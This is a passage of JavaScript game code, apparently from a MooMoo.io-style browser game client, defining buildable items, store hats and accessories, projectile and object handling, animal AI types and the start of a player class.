        scale: 47,
        holdOffset: 20,
        placeOffset: 5,
        itemID: 11,
        itemAID: 27,
      },
      {
        age: 8,
        group: this.groups[3],
        name: "power mill",
        desc: "generates more gold over time",
        req: ["wood", 100, "stone", 50],
        health: 800,
        pps: 2,
        turnSpeed: 0.005,
        spritePadding: 25,
        iconLineMult: 12,
        scale: 47,
        holdOffset: 20,
        placeOffset: 5,
        itemID: 12,
        itemAID: 28,
      },
      {
        age: 5,
        group: this.groups[4],
        type: 2,
        name: "mine",
        desc: "allows you to mine stone",
        req: ["wood", 20, "stone", 100],
        iconLineMult: 12,
        scale: 65,
        holdOffset: 20,
        placeOffset: 0,
        itemID: 13,
        itemAID: 29,
      },
      {
        age: 5,
        group: this.groups[11],
        type: 0,
        name: "sapling",
        desc: "allows you to farm wood",
        req: ["wood", 150],
        iconLineMult: 12,
        colDiv: 0.5,
        scale: 110,
        holdOffset: 50,
        placeOffset: -15,
        itemID: 14,
        itemAID: 30,
      },
      {
        age: 4,
        group: this.groups[5],
        name: "pit trap",
        desc: "pit that traps enemies if they walk over it",
        req: ["wood", 30, "stone", 30],
        trap: true,
        ignoreCollision: true,
        hideFromEnemy: true,
        health: 500,
        colDiv: 0.2,
        scale: 50,
        holdOffset: 20,
        placeOffset: -5,
        alpha: 0.6,
        itemID: 15,
        itemAID: 31,
      },
      {
        age: 4,
        group: this.groups[6],
        name: "boost pad",
        desc: "provides boost when stepped on",
        req: ["stone", 20, "wood", 5],
        ignoreCollision: true,
        boostSpeed: 1.5,
        health: 150,
        colDiv: 0.7,
        scale: 45,
        holdOffset: 20,
        placeOffset: -5,
        itemID: 16,
        itemAID: 32,
      },
      {
        age: 7,
        group: this.groups[7],
        doUpdate: true,
        name: "turret",
        desc: "defensive structure that shoots at enemies",
        req: ["wood", 200, "stone", 150],
        health: 800,
        projectile: 1,
        shootRange: 700,
        shootRate: 2200,
        scale: 43,
        holdOffset: 20,
        placeOffset: -5,
        itemID: 17,
        itemAID: 33,
      },
      {
        age: 7,
        group: this.groups[8],
        name: "platform",
        desc: "platform to shoot over walls and cross over water",
        req: ["wood", 20],
        ignoreCollision: true,
        zIndex: 1,
        health: 300,
        scale: 43,
        holdOffset: 20,
        placeOffset: -5,
        itemID: 18,
        itemAID: 34,
      },
      {
        age: 7,
        group: this.groups[9],
        name: "healing pad",
        desc: "standing on it will slowly heal you",
        req: ["wood", 30, "food", 10],
        ignoreCollision: true,
        healCol: 15,
        health: 400,
        colDiv: 0.7,
        scale: 45,
        holdOffset: 20,
        placeOffset: -5,
        itemID: 19,
        itemAID: 35,
      },
      {
        age: 9,
        group: this.groups[10],
        name: "spawn pad",
        desc: "you will spawn here when you die but it will dissapear",
        req: ["wood", 100, "stone", 100],
        health: 400,
        ignoreCollision: true,
        spawnPoint: true,
        scale: 45,
        holdOffset: 20,
        placeOffset: -5,
        itemID: 20,
        itemAID: 36,
      },
      {
        age: 7,
        group: this.groups[12],
        name: "blocker",
        desc: "blocks building in radius",
        req: ["wood", 30, "stone", 25],
        ignoreCollision: true,
        blocker: 300,
        health: 400,
        colDiv: 0.7,
        scale: 45,
        holdOffset: 20,
        placeOffset: -5,
        itemID: 21,
        itemAID: 37,
      },
      {
        age: 7,
        group: this.groups[13],
        name: "teleporter",
        desc: "teleports you to a random point on the map",
        req: ["wood", 60, "stone", 60],
        ignoreCollision: true,
        teleport: true,
        health: 200,
        colDiv: 0.7,
        scale: 45,
        holdOffset: 20,
        placeOffset: -5,
        itemID: 22,
        itemAID: 38,
      },
    ];

    this.checkItem = {
      index: function (id, myItems) {
        return [0, 1, 2].includes(id)
          ? 0
          : [3, 4, 5].includes(id)
            ? 1
            : [6, 7, 8, 9].includes(id)
              ? 2
              : [10, 11, 12].includes(id)
                ? 3
                : [13, 14].includes(id)
                  ? 5
                  : [15, 16].includes(id)
                    ? 4
                    : [17, 18, 19, 21, 22].includes(id)
                      ? [13, 14].includes(myItems)
                        ? 6
                        : 5
                      : id == 20
                        ? [13, 14].includes(myItems)
                          ? 7
                          : 6
                        : undefined;
      },
    };

    for (let i = 0; i < this.list.length; ++i) {
      this.list[i].id = i;
      if (this.list[i].pre) this.list[i].pre = i - this.list[i].pre;
    }

    if (typeof window !== "undefined") {
      function shuffle(a) {
        for (let i = a.length - 1; i > 0; i--) {
          const j = Math.floor(Math.random() * (i + 1));
          [a[i], a[j]] = [a[j], a[i]];
        }
        return a;
      }
    }
  }
}
class Objectmanager {
  constructor(GameObject, liztobj, UTILS, config, players, server) {
    let mathFloor = Math.floor,
      mathABS = Math.abs,
      mathCOS = Math.cos,
      mathSIN = Math.sin,
      mathPOW = Math.pow,
      mathSQRT = Math.sqrt;

    this.ignoreAdd = false;
    this.hitObj = [];

    this.disableObj = function (obj) {
      obj.active = false;
    };

    let tmpObj;
    this.add = function (sid, x, y, dir, s, type, data, setSID, owner) {
      tmpObj = findObjectBySid(sid);
      if (!tmpObj) {
        tmpObj = gameObjects.find((tmp) => !tmp.active);
        if (!tmpObj) {
          tmpObj = new GameObject(sid);
          gameObjects.push(tmpObj);
        }
      }
      if (setSID) {
        tmpObj.sid = sid;
      }
      tmpObj.init(x, y, dir, s, type, data, owner);
    };

    this.disableBySid = function (sid) {
      let find = findObjectBySid(sid);
      if (find) {
        this.disableObj(find);
      }
    };

    this.removeAllItems = function (sid, server) {
      gameObjects
        .filter((tmp) => tmp.active && tmp.owner && tmp.owner.sid == sid)
        .forEach((tmp) => this.disableObj(tmp));
    };

    this.checkItemLocation = function (
      x,
      y,
      s,
      sM,
      indx,
      ignoreWater,
      placer,
      ignoreSid,
    ) {
      let cantPlace = liztobj.find(
        (tmp) =>
          tmp.active &&
          tmp.sid !== ignoreSid &&
          UTILS.getDistance(x, y, tmp.x, tmp.y) <
          s + (tmp.blocker ? tmp.blocker : tmp.getScale(sM, tmp.isItem)),
      );
      if (cantPlace) return false;
      if (
        !ignoreWater &&
        indx != 18 &&
        y >= config.mapScale / 2 - config.riverWidth / 2 &&
        y <= config.mapScale / 2 + config.riverWidth / 2
      )
        return false;
      return true;
    };
  }
}
class Projectile {
  constructor(players, ais, objectManager, items, config, UTILS, server) {
    this.init = function (indx, x, y, dir, spd, dmg, rng, scl, owner) {
      this.active = true;
      this.tickActive = true;
      this.indx = indx;
      this.x = x;
      this.y = y;
      this.x2 = x;
      this.y2 = y;
      this.dir = dir;
      this.skipMov = true;
      this.speed = spd;
      this.dmg = dmg;
      this.scale = scl;
      this.range = rng;
      this.r2 = rng;
      this.owner = owner;
    };

    this.update = function (delta) {
      if (this.active) {
        let tmpSpeed = this.speed * delta;
        if (!this.skipMov) {
          const nextX = this.x + tmpSpeed * Math.cos(this.dir);
          const nextY = this.y + tmpSpeed * Math.sin(this.dir);
          for (const obj of gameObjects) {
            if (!obj.active) continue;
            if (obj.ignoreCollision || obj.trap || obj.teleport) continue;
            const objScale = obj.blocker
              ? obj.blocker
              : obj.getScale(0.6, obj.isItem);
            const dist = UTILS.getDistance(nextX, nextY, obj.x, obj.y);
            if (dist < objScale) {
              this.active = false;
              return;
            }
          }
          for (const obj of liztobj) {
            if (!obj.active) continue;
            if (obj.ignoreCollision || obj.trap || obj.teleport) continue;
            const objScale = obj.blocker
              ? obj.blocker
              : obj.getScale(0.6, obj.isItem);
            const dist = UTILS.getDistance(nextX, nextY, obj.x, obj.y);
            if (dist < objScale) {
              this.active = false;
              return;
            }
          }
          this.x = nextX;
          this.y = nextY;
          this.range -= tmpSpeed;
          if (this.range <= 0) {
            this.x += this.range * Math.cos(this.dir);
            this.y += this.range * Math.sin(this.dir);
            tmpSpeed = 1;
            this.range = 0;
            this.active = false;
          }
        } else {
          this.skipMov = false;
        }
      }
    };
    this.tickUpdate = function (delta) {
      if (this.tickActive) {
        let tmpSpeed = this.speed * delta;
        if (!this.skipMov) {
          this.x2 += tmpSpeed * Math.cos(this.dir);
          this.y2 += tmpSpeed * Math.sin(this.dir);
          this.r2 -= tmpSpeed;
          if (this.r2 <= 0) {
            this.x2 += this.r2 * Math.cos(this.dir);
            this.y2 += this.r2 * Math.sin(this.dir);
            tmpSpeed = 1;
            this.r2 = 0;
            this.tickActive = false;
          }
        } else {
          this.skipMov = false;
        }
      }
    };
  }
}
class Store {
  constructor() {
    this.hats = [
      {
        id: 45,
        name: "Shame!",
        dontSell: true,
        price: 0,
        scale: 120,
        desc: "hacks are for winners",
      },
      {
        id: 51,
        name: "Moo Cap",
        price: 0,
        scale: 120,
        desc: "coolest mooer around",
      },
      {
        id: 50,
        name: "Apple Cap",
        price: 0,
        scale: 120,
        desc: "apple farms remembers",
      },
      {
        id: 28,
        name: "Moo Head",
        price: 0,
        scale: 120,
        desc: "no effect",
      },
      {
        id: 29,
        name: "Pig Head",
        price: 0,
        scale: 120,
        desc: "no effect",
      },
      {
        id: 30,
        name: "Fluff Head",
        price: 0,
        scale: 120,
        desc: "no effect",
      },
      {
        id: 36,
        name: "Pandou Head",
        price: 0,
        scale: 120,
        desc: "no effect",
      },
      {
        id: 37,
        name: "Bear Head",
        price: 0,
        scale: 120,
        desc: "no effect",
      },
      {
        id: 38,
        name: "Monkey Head",
        price: 0,
        scale: 120,
        desc: "no effect",
      },
      {
        id: 44,
        name: "Polar Head",
        price: 0,
        scale: 120,
        desc: "no effect",
      },
      {
        id: 35,
        name: "Fez Hat",
        price: 0,
        scale: 120,
        desc: "no effect",
      },
      {
        id: 42,
        name: "Enigma Hat",
        price: 0,
        scale: 120,
        desc: "join the enigma army",
      },
      {
        id: 43,
        name: "Blitz Hat",
        price: 0,
        scale: 120,
        desc: "hey everybody i'm blitz",
      },
      {
        id: 49,
        name: "Bob XIII Hat",
        price: 0,
        scale: 120,
        desc: "like and subscribe",
      },
      {
        id: 57,
        name: "Pumpkin",
        price: 50,
        scale: 120,
        desc: "Spooooky",
      },
      {
        id: 8,
        name: "Bummle Hat",
        price: 100,
        scale: 120,
        desc: "no effect",
      },
      {
        id: 2,
        name: "Straw Hat",
        price: 500,
        scale: 120,
        desc: "no effect",
      },
      {
        id: 15,
        name: "Winter Cap",
        price: 600,
        scale: 120,
        desc: "allows you to move at normal speed in snow",
        coldM: 1,
      },
      {
        id: 5,
        name: "Cowboy Hat",
        price: 1000,
        scale: 120,
        desc: "no effect",
      },
      {
        id: 4,
        name: "Ranger Hat",
        price: 2000,
        scale: 120,
        desc: "no effect",
      },
      {
        id: 18,
        name: "Explorer Hat",
        price: 2000,
        scale: 120,
        desc: "no effect",
      },
      {
        id: 31,
        name: "Flipper Hat",
        price: 2500,
        scale: 120,
        desc: "have more control while in water",
        watrImm: true,
      },
      {
        id: 1,
        name: "Marksman Cap",
        price: 3000,
        scale: 120,
        desc: "increases arrow speed and range",
        aMlt: 1.3,
      },
      {
        id: 10,
        name: "Bush Gear",
        price: 3000,
        scale: 160,
        desc: "allows you to disguise yourself as a bush",
      },
      {
        id: 48,
        name: "Halo",
        price: 3000,
        scale: 120,
        desc: "no effect",
      },
      {
        id: 6,
        name: "Soldier Helmet",
        price: 4000,
        scale: 120,
        desc: "reduces damage taken but slows movement",
        spdMult: 0.94,
        dmgMult: 0.75,
      },
      {
        id: 23,
        name: "Anti Venom Gear",
        price: 4000,
        scale: 120,
        desc: "makes you immune to poison",
        poisonRes: 1,
      },
      {
        id: 13,
        name: "Medic Gear",
        price: 5000,
        scale: 110,
        desc: "slowly regenerates health over time",
        healthRegen: 3,
      },
      {
        id: 9,
        name: "Miners Helmet",
        price: 5000,
        scale: 120,
        desc: "earn 1 extra gold per resource",
        extraGold: 1,
      },
      {
        id: 32,
        name: "Musketeer Hat",
        price: 5000,
        scale: 120,
        desc: "reduces cost of projectiles",
        projCost: 0.5,
      },
      {
        id: 7,
        name: "Bull Helmet",
        price: 6000,
        scale: 120,
        desc: "increases damage done but drains health",
        healthRegen: -5,
        dmgMultO: 1.5,
        spdMult: 0.96,
      },
      {
        id: 22,
        name: "Emp Helmet",
        price: 6000,
        scale: 120,
        desc: "turrets won't attack but you move slower",
        antiTurret: 1,
        spdMult: 0.7,
      },
      {
        id: 12,
        name: "Booster Hat",
        price: 6000,
        scale: 120,
        desc: "increases your movement speed",
        spdMult: 1.16,
      },
      {
        id: 26,
        name: "Barbarian Armor",
        price: 8000,
        scale: 120,
        desc: "knocks back enemies that attack you",
        dmgK: 0.6,
      },
      {
        id: 21,
        name: "Plague Mask",
        price: 10000,
        scale: 120,
        desc: "melee attacks deal poison damage",
        poisonDmg: 5,
        poisonTime: 6,
      },
      {
        id: 46,
        name: "Bull Mask",
        price: 10000,
        scale: 120,
        desc: "bulls won't target you unless you attack them",
        bullRepel: 1,
      },
      {
        id: 14,
        name: "Windmill Hat",
        topSprite: true,
        price: 10000,
        scale: 120,
        desc: "generates points while worn",
        pps: 1.5,
      },
      {
        id: 11,
        name: "Spike Gear",
        topSprite: true,
        price: 10000,
        scale: 120,
        desc: "deal damage to players that damage you",
        dmg: 0.45,
      },
      {
        id: 53,
        name: "Turret Gear",
        topSprite: true,
        price: 10000,
        scale: 120,
        desc: "you become a walking turret",
        turret: {
          proj: 1,
          range: 700,
          rate: 2500,
        },
        spdMult: 0.7,
      },
      {
        id: 20,
        name: "Samurai Armor",
        price: 12000,
        scale: 120,
        desc: "increased attack speed and fire rate",
        atkSpd: 0.78,
      },
      {
        id: 58,
        name: "Dark Knight",
        price: 12000,
        scale: 120,
        desc: "restores health when you deal damage",
        healD: 0.4,
      },
      {
        id: 27,
        name: "Scavenger Gear",
        price: 15000,
        scale: 120,
        desc: "earn double points for each kill",
        kScrM: 2,
      },
      {
        id: 40,
        name: "Tank Gear",
        price: 15000,
        scale: 120,
        desc: "increased damage to buildings but slower movement",
        spdMult: 0.3,
        bDmg: 3.3,
      },
      {
        id: 52,
        name: "Thief Gear",
        price: 15000,
        scale: 120,
        desc: "steal half of a players gold when you kill them",
        goldSteal: 0.5,
      },
      {
        id: 55,
        name: "Bloodthirster",
        price: 20000,
        scale: 120,
        desc: "Restore Health when dealing damage. And increased damage",
        healD: 0.25,
        dmgMultO: 1.2,
      },
      {
        id: 56,
        name: "Assassin Gear",
        price: 20000,
        scale: 120,
        desc: "Go invisible when not moving. Can't eat. Increased speed",
        noEat: true,
        spdMult: 1.1,
        invisTimer: 1000,
      },
    ];

    this.accessories = [
      {
        id: 12,
        name: "Snowball",
        price: 1000,
        scale: 105,
        xOff: 18,
        desc: "no effect",
      },
      {
        id: 9,
        name: "Tree Cape",
        price: 1000,
        scale: 90,
        desc: "no effect",
      },
      {
        id: 10,
        name: "Stone Cape",
        price: 1000,
        scale: 90,
        desc: "no effect",
      },
      {
        id: 3,
        name: "Cookie Cape",
        price: 1500,
        scale: 90,
        desc: "no effect",
      },
      {
        id: 8,
        name: "Cow Cape",
        price: 2000,
        scale: 90,
        desc: "no effect",
      },
      {
        id: 11,
        name: "Monkey Tail",
        price: 2000,
        scale: 97,
        xOff: 25,
        desc: "Super speed but reduced damage",
        spdMult: 1.35,
        dmgMultO: 0.2,
      },
      {
        id: 17,
        name: "Apple Basket",
        price: 3000,
        scale: 80,
        xOff: 12,
        desc: "slowly regenerates health over time",
        healthRegen: 1,
      },
      {
        id: 6,
        name: "Winter Cape",
        price: 3000,
        scale: 90,
        desc: "no effect",
      },
      {
        id: 4,
        name: "Skull Cape",
        price: 4000,
        scale: 90,
        desc: "no effect",
      },
      {
        id: 5,
        name: "Dash Cape",
        price: 5000,
        scale: 90,
        desc: "no effect",
      },
      {
        id: 2,
        name: "Dragon Cape",
        price: 6000,
        scale: 90,
        desc: "no effect",
      },
      {
        id: 1,
        name: "Super Cape",
        price: 8000,
        scale: 90,
        desc: "no effect",
      },
      {
        id: 7,
        name: "Troll Cape",
        price: 8000,
        scale: 90,
        desc: "no effect",
      },
      {
        id: 14,
        name: "Thorns",
        price: 10000,
        scale: 115,
        xOff: 20,
        desc: "no effect",
      },
      {
        id: 15,
        name: "Blockades",
        price: 10000,
        scale: 95,
        xOff: 15,
        desc: "no effect",
      },
      {
        id: 20,
        name: "Devils Tail",
        price: 10000,
        scale: 95,
        xOff: 20,
        desc: "no effect",
      },
      {
        id: 16,
        name: "Sawblade",
        price: 12000,
        scale: 90,
        spin: true,
        xOff: 0,
        desc: "deal damage to players that damage you",
        dmg: 0.15,
      },
      {
        id: 13,
        name: "Angel Wings",
        price: 15000,
        scale: 138,
        xOff: 22,
        desc: "slowly regenerates health over time",
        healthRegen: 3,
      },
      {
        id: 19,
        name: "Shadow Wings",
        price: 15000,
        scale: 138,
        xOff: 22,
        desc: "increased movement speed",
        spdMult: 1.1,
      },
      {
        id: 18,
        name: "Blood Wings",
        price: 20000,
        scale: 178,
        xOff: 26,
        desc: "restores health when you deal damage",
        healD: 0.2,
      },
      {
        id: 21,
        name: "Corrupt X Wings",
        price: 20000,
        scale: 178,
        xOff: 26,
        desc: "deal damage to players that damage you",
        dmg: 0.25,
      },
    ];
  }
}
class ProjectileManager {
  constructor(
    Projectile,
    projectiles,
    players,
    ais,
    objectManager,
    items,
    config,
    UTILS,
    server,
  ) {
    this.addProjectile = function (
      x,
      y,
      dir,
      range,
      speed,
      indx,
      owner,
      ignoreObj,
      layer,
      inWindow,
    ) {
      let tmpData = items.projectiles[indx];
      let tmpProj;
      for (let i = 0; i < projectiles.length; ++i) {
        if (!projectiles[i].active) {
          tmpProj = projectiles[i];
          break;
        }
      }
      if (!tmpProj) {
        tmpProj = new Projectile(
          players,
          ais,
          objectManager,
          items,
          config,
          UTILS,
          server,
        );
        tmpProj.sid = projectiles.length;
        projectiles.push(tmpProj);
      }
      tmpProj.init(
        indx,
        x,
        y,
        dir,
        speed,
        tmpData.dmg,
        range,
        tmpData.scale,
        owner,
      );
      tmpProj.ignoreObj = ignoreObj;
      tmpProj.layer = layer || tmpData.layer;
      tmpProj.inWindow = inWindow;
      tmpProj.src = tmpData.src;
      return tmpProj;
    };
  }
}
class AiManager {
  constructor(
    ais,
    AI,
    players,
    items,
    objectManager,
    config,
    UTILS,
    scoreCallback,
    server,
  ) {
    this.aiTypes = [
      {
        id: 0,
        src: "cow_1",
        killScore: 150,
        health: 500,
        weightM: 0.8,
        speed: 0.00095,
        turnSpeed: 0.001,
        scale: 72,
        drop: ["food", 50],
      },
      {
        id: 1,
        src: "pig_1",
        killScore: 200,
        health: 800,
        weightM: 0.6,
        speed: 0.00085,
        turnSpeed: 0.001,
        scale: 72,
        drop: ["food", 80],
      },
      {
        id: 2,
        name: "Bull",
        src: "bull_2",
        hostile: true,
        dmg: 20,
        killScore: 1000,
        health: 1800,
        weightM: 0.5,
        speed: 0.00094,
        turnSpeed: 0.00074,
        scale: 78,
        viewRange: 800,
        chargePlayer: true,
        drop: ["food", 100],
      },
      {
        id: 3,
        name: "Bully",
        src: "bull_1",
        hostile: true,
        dmg: 20,
        killScore: 2000,
        health: 2800,
        weightM: 0.45,
        speed: 0.001,
        turnSpeed: 0.0008,
        scale: 90,
        viewRange: 900,
        chargePlayer: true,
        drop: ["food", 400],
      },
      {
        id: 4,
        name: "Wolf",
        src: "wolf_1",
        hostile: true,
        dmg: 8,
        killScore: 500,
        health: 300,
        weightM: 0.45,
        speed: 0.001,
        turnSpeed: 0.002,
        scale: 84,
        viewRange: 800,
        chargePlayer: true,
        drop: ["food", 200],
      },
      {
        id: 5,
        name: "Quack",
        src: "chicken_1",
        dmg: 8,
        killScore: 2000,
        noTrap: true,
        health: 300,
        weightM: 0.2,
        speed: 0.0018,
        turnSpeed: 0.006,
        scale: 70,
        drop: ["food", 100],
      },
      {
        id: 6,
        name: "MOOSTAFA",
        nameScale: 50,
        src: "enemy",
        hostile: true,
        dontRun: true,
        fixedSpawn: true,
        spawnDelay: 60000,
        noTrap: true,
        colDmg: 100,
        dmg: 40,
        killScore: 8000,
        health: 18000,
        weightM: 0.4,
        speed: 0.0007,
        turnSpeed: 0.01,
        scale: 80,
        spriteMlt: 1.8,
        leapForce: 0.9,
        viewRange: 1000,
        hitRange: 210,
        hitDelay: 1000,
        chargePlayer: true,
        drop: ["food", 100],
      },
      {
        id: 7,
        name: "Treasure",
        hostile: true,
        nameScale: 35,
        src: "crate_1",
        fixedSpawn: true,
        spawnDelay: 120000,
        colDmg: 200,
        killScore: 5000,
        health: 20000,
        weightM: 0.1,
        speed: 0.0,
        turnSpeed: 0.0,
        scale: 70,
        spriteMlt: 1.0,
      },
      {
        id: 8,
        name: "MOOFIE",
        src: "wolf_2",
        hostile: true,
        fixedSpawn: true,
        dontRun: true,
        hitScare: 4,
        spawnDelay: 30000,
        noTrap: true,
        nameScale: 35,
        dmg: 10,
        colDmg: 100,
        killScore: 3000,
        health: 7000,
        weightM: 0.45,
        speed: 0.0015,
        turnSpeed: 0.002,
        scale: 90,
        viewRange: 800,
        chargePlayer: true,
        drop: ["food", 1000],
      },
      {
        id: 9,
        name: "💀MOOFIE",
        src: "wolf_2",
        hostile: !0,
        fixedSpawn: !0,
        dontRun: !0,
        hitScare: 50,
        spawnDelay: 6e4,
        noTrap: !0,
        nameScale: 35,
        dmg: 12,
        colDmg: 100,
        killScore: 3e3,
        health: 9e3,
        weightM: 0.45,
        speed: 0.0015,
        turnSpeed: 0.0025,
        scale: 94,
        viewRange: 1440,
        chargePlayer: !0,
        drop: ["food", 3e3],
        minSpawnRange: 0.85,
        maxSpawnRange: 0.9,
      },
      {
        id: 10,
        name: "💀Wolf",
        src: "wolf_1",
        hostile: !0,
        fixedSpawn: !0,
        dontRun: !0,
        hitScare: 50,
        spawnDelay: 3e4,
        dmg: 10,
        killScore: 700,
        health: 500,
        weightM: 0.45,
        speed: 0.00115,
        turnSpeed: 0.0025,
        scale: 88,
        viewRange: 1440,
        chargePlayer: !0,
        drop: ["food", 400],
        minSpawnRange: 0.85,
        maxSpawnRange: 0.9,
      },
      {
        id: 11,
        name: "💀Bully",
        src: "bull_1",
        hostile: !0,
        fixedSpawn: !0,
        dontRun: !0,
        hitScare: 50,
        dmg: 20,
        killScore: 5e3,
        health: 5e3,
        spawnDelay: 1e5,
        weightM: 0.45,
        speed: 0.00115,
        turnSpeed: 0.0025,
        scale: 94,
        viewRange: 1440,
        chargePlayer: !0,
        drop: ["food", 800],
        minSpawnRange: 0.85,
        maxSpawnRange: 0.9,
      },
    ];

    this.spawn = function (x, y, dir, index) {
      let tmpObj = ais.find((tmp) => !tmp.active);
      if (!tmpObj) {
        tmpObj = new AI(
          ais.length,
          objectManager,
          players,
          items,
          UTILS,
          config,
          scoreCallback,
          server,
        );
        ais.push(tmpObj);
      }
      tmpObj.init(x, y, dir, index, this.aiTypes[index]);
      return tmpObj;
    };
  }
}

class AI {
  constructor(
    sid,
    _objectManager,
    _players,
    _items,
    UTILS,
    config,
    _scoreCallback,
    _server,
  ) {
    this.sid = sid;
    this.isAI = true;
    this.nameIndex = UTILS.randInt(0, config.cowNames.length - 1);

    this.init = function (x, y, dir, index, data) {
      this.x = x;
      this.y = y;
      this.startX = data.fixedSpawn ? x : null;
      this.startY = data.fixedSpawn ? y : null;
      this.xVel = 0;
      this.yVel = 0;
      this.zIndex = 0;
      this.dir = dir;
      this.dirPlus = 0;
      this.showName = "aaa";
      this.index = index;
      this.src = data.src;
      if (data.name) this.name = data.name;
      this.weightM = data.weightM;
      this.speed = data.speed;
      this.killScore = data.killScore;
      this.turnSpeed = data.turnSpeed;
      this.scale = data.scale;
      this.maxHealth = data.health;
      this.leapForce = data.leapForce;
      this.health = this.maxHealth;
      this.chargePlayer = data.chargePlayer;
      this.viewRange = data.viewRange;
      this.drop = data.drop;
      this.dmg = data.dmg;
      this.hostile = data.hostile;
      this.dontRun = data.dontRun;
      this.hitRange = data.hitRange;
      this.hitDelay = data.hitDelay;
      this.hitScare = data.hitScare;
      this.spriteMlt = data.spriteMlt;
      this.nameScale = data.nameScale;
      this.colDmg = data.colDmg;
      this.noTrap = data.noTrap;
      this.spawnDelay = data.spawnDelay;
      this.hitWait = 0;
      this.waitCount = 1000;
      this.moveCount = 0;
      this.targetDir = 0;
      this.active = true;
      this.alive = true;
      this.runFrom = null;
      this.chargeTarget = null;
      this.dmgOverTime = {};
    };

    let tmpRatio = 0;
    let animIndex = 0;
    this.animate = function (delta) {
      if (this.animTime > 0) {
        this.animTime -= delta;
        if (this.animTime <= 0) {
          this.animTime = 0;
          this.dirPlus = 0;
          tmpRatio = 0;
          animIndex = 0;
        } else {
          if (animIndex == 0) {
            tmpRatio += delta / (this.animSpeed * config.hitReturnRatio);
            this.dirPlus = UTILS.lerp(
              0,
              this.targetAngle,
              Math.min(1, tmpRatio),
            );
            if (tmpRatio >= 1) {
              tmpRatio = 1;
              animIndex = 1;
            }
          } else {
            tmpRatio -= delta / (this.animSpeed * (1 - config.hitReturnRatio));
            this.dirPlus = UTILS.lerp(
              0,
              this.targetAngle,
              Math.max(0, tmpRatio),
            );
          }
        }
      }
    };

    this.startAnim = function () {
      this.animTime = this.animSpeed = 600;
      this.targetAngle = Math.PI * 0.8;
      tmpRatio = 0;
      animIndex = 0;
    };
  }
}
class addCh {
  constructor(x, y, chat, tmpObj) {
    this.x = x;
    this.y = y;
    this.alpha = 0;
    this.active = true;
    this.alive = false;
    this.chat = chat;
    this.owner = tmpObj;
  }
}
class DeadPlayer {
  constructor(
    x,
    y,
    dir,
    buildIndex,
    weaponIndex,
    weaponVariant,
    skinColor,
    scale,
    name,
    skinIndex,
    tailIndex,
  ) {
    this.x = x;
    this.y = y;
    this.lastDir = dir;
    this.dir = dir + Math.PI;
    this.buildIndex = buildIndex;
    this.weaponIndex = weaponIndex;
    this.weaponVariant = weaponVariant;
    this.skinColor = skinColor;
    this.scale = scale;
    this.visScale = 0;
    this.name = name;
    this.skinIndex = skinIndex;
    this.tailIndex = tailIndex;
    this.alpha = 1;
    this.active = true;
    this.animate = function (delta) {
      let d2 = UTILS.getAngleDist(this.lastDir, this.dir);
      if (d2 > 0.01) {
        this.dir += d2 / 20;
      } else {
        this.dir = this.lastDir;
      }
      if (this.visScale < this.scale) {
        this.visScale += delta / (this.scale / 2);
        if (this.visScale >= this.scale) {
          this.visScale = this.scale;
        }
      }
      this.alpha -= delta / 30000;
      if (this.alpha <= 0) {
        this.alpha = 0;
        this.active = false;
      }
    };
  }
}
class Player {
  constructor(
    id,
    sid,
    config,
    UTILS,
    _projectileManager,
    _objectManager,
    _players,
    _ais,
    items,
    hats,
    accessories,
    _server,
    _scoreCallback,
    _iconCallback,
  ) {
    this.id = id;
    this.sid = sid;
    this.tmpScore = 0;
    this.team = null;
    this.latestSkin = 0;
    this.oldSkinIndex = 0;
    this.skinIndex = 0;
    this.latestTail = 0;
    this.oldTailIndex = 0;
    this.tailIndex = 0;
    this.hitTime = 0;
    this.lastHit = 0;
    this.showName = "NOOO";
    this.tails = {};

    for (let i = 0; i < accessories.length; ++i) {
      if (accessories[i].price <= 0) this.tails[accessories[i].id] = 1;
    }
    this.skins = {};
    for (let i = 0; i < hats.length; ++i) {
      if (hats[i].price <= 0) this.skins[hats[i].id] = 1;
    }

    this.points = 0;
    this.dt = 0;
    this.hidden = false;
    this.itemCounts = {};
    this.isPlayer = true;
    this.pps = 0;
    this.moveDir = undefined;
    this.skinRot = 0;
    this.lastPing = 0;
    this.iconIndex = 0;
    this.skinColor = 0;
    this.dist2 = 0;
    this.aim2 = 0;
    this.maxSpeed = 1;
    this.chat = {
      message: null,
      count: 0,
    };
    this.backupNobull = true;
    this.spawn = function (moofoll) {
      this.attacked = false;
      this.timeDamaged = 0;
      this.timeHealed = 0;
      this.pinge = 0;
      this.millPlace = "NOOO";
      this.lastshamecount = 0;
      this.death = false;
      this.spinDir = 0;
      this.sync = false;
      this.antiBull = 0;
      this.bullTimer = 0;
      this.poisonTimer = 0;
      this.active = true;
      this.alive = true;
      this.lockMove = false;
      this.lockDir = false;
      this.minimapCounter = 0;
      this.chatCountdown = 0;
      this.shameCount = 0;
      this.shameTimer = 0;
      this.sentTo = {};
      this.gathering = 0;
      this.gatherIndex = 0;
      this.shooting = {};
      this.shootIndex = 9;
      this.autoGather = 0;
      this.animTime = 0;
      this.animSpeed = 0;
      this.mouseState = 0;
      this.buildIndex = -1;
      this.weaponIndex = 0;
      this.weaponCode = 0;
      this.weaponVariant = 0;
      this.primaryIndex = undefined;
      this.secondaryIndex = undefined;
      this.dmgOverTime = {};
      this.noMovTimer = 0;
      this.maxXP = 300;
      this.XP = 0;
      this.age = 1;
      this.kills = 0;
      this.upgrAge = 2;
      this.upgradePoints = 0;
      this.x = 0;
      this.y = 0;
      this.oldXY = {
        x: 0,
        y: 0,
      };
      this.zIndex = 0;
      this.xVel = 0;
      this.yVel = 0;
      this.slowMult = 1;
      this.dir = 0;
      this.dirPlus = 0;
      this.targetDir = 0;
      this.targetAngle = 0;
      this.maxHealth = 100;
      this.health = this.maxHealth;
      this.oldHealth = this.maxHealth;
      this.damaged = 0;
      this.scale = config.playerScale;
      this.speed = config.playerSpeed;
      this.resetMoveDir();
      this.resetResources(moofoll);
      this.items = [0, 3, 6, 10];
      this.weapons = [0];
      this.shootCount = 0;
      this.weaponXP = [];
      this.reloads = {
        0: 0,
        1: 0,
        2: 0,
        3: 0,
        4: 0,
        5: 0,
        6: 0,
        7: 0,
        8: 0,
        9: 0,
        10: 0,
        11: 0,
        12: 0,
        13: 0,
        14: 0,
        15: 0,
        53: 0,
      };
      this.bowThreat = {
        9: 0,
        12: 0,
        13: 0,
        15: 0,
      };
      this.damageThreat = 0;
      this.inTrap = false;
      this.canEmpAnti = false;
      this.empAnti = false;
      this.soldierAnti = false;
      this.poisonTick = 0;
      this.bullTick = 0;
      this.setPoisonTick = false;
      this.setBullTick = false;
      this.antiTimer = 2;
    };

    this.resetMoveDir = function () {
      this.moveDir = undefined;
    };

    this.resetResources = function (moofoll) {
